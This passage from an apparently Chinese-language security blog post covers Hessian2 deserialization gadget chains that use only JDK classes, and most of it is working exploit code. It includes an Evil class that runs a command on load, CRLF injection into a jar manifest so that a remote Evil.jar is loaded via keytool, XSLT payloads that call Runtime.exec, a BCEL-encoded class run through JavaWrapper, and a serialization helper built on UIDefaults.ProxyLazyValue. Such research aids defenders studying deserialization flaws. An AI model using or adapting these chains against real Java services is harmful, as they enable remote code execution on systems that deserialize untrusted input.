<span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">kt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        kt.run(args, System.out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String[] args, PrintStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            args = parseArgs(args);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                doCommands(out);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(rb.getString(<span class="string">&quot;keytool.error.&quot;</span>) + e);</span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                e.printStackTrace(System.out);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!debug) &#123;</span><br><span class="line">                System.exit(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            printWeakWarnings(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span>[] pass : passwords) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Arrays.fill(pass, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                    pass = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ksStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                ksStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>在run方法中，又去使用了 doCommands 方法，这个doCommands方法会去加载类。方法内容比较多，本质上是去获取了一个URLClassLoader，然后通过我们可控的字符串进行一个加载，要走到这一步还需要设置几个字段值才行，但是都可控。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224171853534.png"
                      alt="image-20230224171853534"
                ></p>
<p>通过上面的内容，我们的思路就很明显了，先 System.setProperty 设置 jfr.save.generated.asm 为 true， 然后 Utils 执行静态方法 writeGeneratedAsm 写入一个恶意 jar 包，然后通过 sun.security.tools.keytool.Main 的 main 方法，最终通过URLClassLoader 进行加载恶意类。</p>
<h3 id="恶意jar"><a href="#恶意jar" class="headerlink" title="恶意jar"></a>恶意jar</h3><p><strong>Evil.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.java</span><br><span class="line">jar cf Evil.jar Evil.class</span><br></pre></td></tr></table></figure></div>

<p>我又去研究了一下这个方法，好像就是直接写的字节数据，不用jar数据。也就是说我们直接写入class文件内容即可，这步jar貌似多余了，只执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.java</span><br></pre></td></tr></table></figure></div>

<p>貌似就行，我这里是这样的。</p>
<p>或者写入jar进行读取也行，感觉有点多此一举</p>
<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><p>windows测试</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> jdk.jfr.internal.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.security.tools.keytool.Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">writeGeneratedAsm_keytool_Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 设置对应的属性值</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;jfr.save.generated.asm&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;jfr.save.generated.asm&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取 class 中的字节</span></span><br><span class="line">        <span class="comment">//byte[] classCode = Files.readAllBytes(Paths.get(&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil.class&quot;));</span></span><br><span class="line">        <span class="type">byte</span>[] jarCode = Files.readAllBytes(Paths.get(<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil.jar&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入文件，这里需要注意，目录需要多写一层，多的这层是后续创建的文件的名字，后缀为class和asm</span></span><br><span class="line">        <span class="comment">// 后续修改 aimpath 即可</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">aimPath</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil&quot;</span>;</span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;jdk.jfr.internal.Utils&quot;, &quot;writeGeneratedASM&quot;, new Object[]&#123;aimPath, jarCode&#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入的jar路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarPath</span> <span class="operator">=</span> aimPath+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="comment">// 写入的class路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span>aimPath.substring (<span class="number">0</span>, aimPath.length()-<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入后进行读取</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;sun.security.tools.keytool.Main&quot;</span>,<span class="string">&quot;main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-genkeypair&quot;</span>,<span class="string">&quot;-keypass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-keystore&quot;</span>,<span class="string">&quot;koishi&quot;</span>,<span class="string">&quot;-storepass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-providername&quot;</span>,<span class="string">&quot;hackx&quot;</span>,<span class="string">&quot;-providerclass&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;-providerpath&quot;</span>,jarPath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="⑥sun-tools-jar-Main-main-sun-security-tools-keytool-Main-main"><a href="#⑥sun-tools-jar-Main-main-sun-security-tools-keytool-Main-main" class="headerlink" title="⑥sun.tools.jar.Main.main + sun.security.tools.keytool.Main.main"></a>⑥sun.tools.jar.Main.main + sun.security.tools.keytool.Main.main</h2><p>和上面那个差不多，写入后进行读取。</p>
<p>sun.security.tools.keytool.Main.main 很熟悉了，就不做过多介绍了。</p>
<p>通过 sun.tools.jar.Main.main 生成jar文件，在填入参数时可进行 CRLF 注入，采用 cfe 模式，通过 e 指定 Main-Class 的时候定义 Class-Path 从而远程加载恶意 jar 达到 RCE。</p>
<p><strong>Class-Path 指定jar包的依赖关系，class loader会依据这个路径来搜索class</strong></p>
<p>再通过 sun.security.tools.keytool.Main.main 触发 Class-Path 加载 jar 包</p>
<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jar_Main_keytool_Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;sun.tools.jar.Main&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">winTestPath</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Koishi.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">linuxAimPath</span> <span class="operator">=</span> <span class="string">&quot;/tmp/koishi.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">testExistFile</span> <span class="operator">=</span><span class="string">&quot;R:\\a\\hello.txt&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">linuxExistFile</span> <span class="operator">=</span> <span class="string">&quot;/etc/hosts&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCRLFHTTP</span> <span class="operator">=</span> <span class="string">&quot;aaaa\nClass-Path: http://127.0.0.1:8088/Evil.jar&quot;</span>;</span><br><span class="line">        Object[] evilargs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;cfe&quot;</span>, winTestPath,evilCRLFHTTP,testExistFile &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 写入Class-Path 内容</span></span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(classname,methodName,evilargs);</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;sun.security.tools.keytool.Main&quot;</span>,<span class="string">&quot;main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-genkeypair&quot;</span>,<span class="string">&quot;-keypass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-keystore&quot;</span>,<span class="string">&quot;koishi&quot;</span>,<span class="string">&quot;-storepass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-providername&quot;</span>,<span class="string">&quot;hackx&quot;</span>,<span class="string">&quot;-providerclass&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;-providerpath&quot;</span>,winTestPath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="触发效果"><a href="#触发效果" class="headerlink" title="触发效果"></a>触发效果</h3><p>这个利用方法我还是头一回见，但是还没细跟，我这里放一下一些操作导致的结果的截图</p>
<p>首先，会去 winTestPath 下创建一个指定jar包，内容包含我们传入的 testExistFile </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225105746044.png"
                      alt="image-20230225105746044"
                ></p>
<p>然后其 Main-Class 会被修改为  evilCRLFHTTP 的内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225105828181.png"
                      alt="image-20230225105828181"
                ></p>
<p>随后我们通过使用 sun.security.tools.keytool.Main 去读取这个jar包，他就会触发去加载我们写的 Class-Path 里面的jar文件，而这个jar文件就是我们上一个写好的jar包，里面包含Evil.class。能弹出计算器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230225110006619.png"
                      alt="image-20230225110006619"
                ></p>
<h2 id="⑦com-sun-org-apache-xalan-internal-xslt-Process-main"><a href="#⑦com-sun-org-apache-xalan-internal-xslt-Process-main" class="headerlink" title="⑦com.sun.org.apache.xalan.internal.xslt.Process._main"></a>⑦com.sun.org.apache.xalan.internal.xslt.Process._main</h2><p>这个需要点前置知识</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1963/" >Xalan-J XSLT 整数截断漏洞利用构造(CVE-2022-34169) (seebug.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>XLST Injection:</p>
<ul>
<li><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT" >https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Injection</p>
</li>
<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf" >https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<p>这个实质上就是利用了 CVE-2022-34169 这个漏洞点。</p>
<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xslt.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xslt_Process_main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilFilePath</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8888/payload2.xslt&quot;</span>;</span><br><span class="line">        <span class="comment">//Process._main(new String[]&#123;&quot;-XSLTC&quot;, &quot;-XSL&quot;, evilFilePath&#125;);</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>,<span class="string">&quot;_main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XSLTC&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, evilFilePath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>几个可用exp</p>
<p><strong>payload2.xslt</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:rt</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span> <span class="attr">xmlns:ob</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:getRuntime()&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;rt:exec($rtobject,&#x27;calc&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;processString&quot;</span> <span class="attr">select</span>=<span class="string">&quot;ob:toString($process)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$processString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>payload3.xslt</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:java</span>=<span class="string">&quot;http://saxon.sf.net/java-type&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;Runtime:exec(Runtime:getRuntime(),&#x27;calc&#x27;)&quot;</span> <span class="attr">xmlns:Runtime</span>=<span class="string">&quot;java.lang.Runtime&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>有给xalan依赖的话，还可以尝试尝试</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f" >https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="–利用特定类的-equals-方法–"><a href="#–利用特定类的-equals-方法–" class="headerlink" title="–利用特定类的 equals 方法–"></a>–利用特定类的 equals 方法–</h2><p>除了之前上面的toStirng，其实还能挖到直接通过 equals 去触发的payload</p>
<div class="highlight-container" data-rel="Ceylon"><figure class="iseeu highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match path=(source:Method &#123;NAME:<span class="string">&quot;equals&quot;</span>&#125;)-[:CALL*<span class="number">1</span>]-&gt;(m<span class="number">1</span>:Method &#123;NAME:<span class="string">&quot;toString&quot;</span>&#125;) <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure></div>

<p>有以下几个。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XStringForFSB</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line"># dubbo 中该类已被禁用但是其它地方可用于代替上面两项</span><br><span class="line">javax.sound.sampled.AudioFileFormat</span><br><span class="line">javax.sound.sampled.AudioFormat</span><br></pre></td></tr></table></figure></div>



<p>也可以考虑通过设置map 的俩node去触发equals方法。</p>
<p>或者依靠spring依赖。</p>
<h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>之前提到过，hessian2会去执行 hashmap 的 put 方法，随后就是 putval 方法，执行putval的时候会执行equals 键的 equals 方法，而我们设置为 UIDefaults ，其继承自 hashtable，又未重写 equals 方法，在hashtable又会触发其的get方法，这也就到了之前的链子的起始点了 UIDefaults.get 。</p>
<p>以简单的 JavaWrapper 为例，通过hashcode方法进行利用。</p>
<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><p>工具类写入方法</p>
<p>（这里以能执行任意jar下的class的 UIDefaults.ProxyLazyValue 为例，当被禁用时改为非万能方式）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute1</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">    <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">    Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">    uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(uiDefaults,uiDefaults2);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">    oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">    oo.writeObject(hashMap);</span><br><span class="line">    oo.flush();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">    <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">    hessian2Input.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_hashCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> OnlyJDK.evilFiles.Evil_main;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里以 JavaWrapper_mian 这个链子作为演示，这个能行其他就业同理修改修改即可</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaWrapper_mian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(Evil_main.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.originalSerialize_Execute1(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><p>当环境存在 spring 依赖时，可以使用 HotSwappableTargetSource</p>
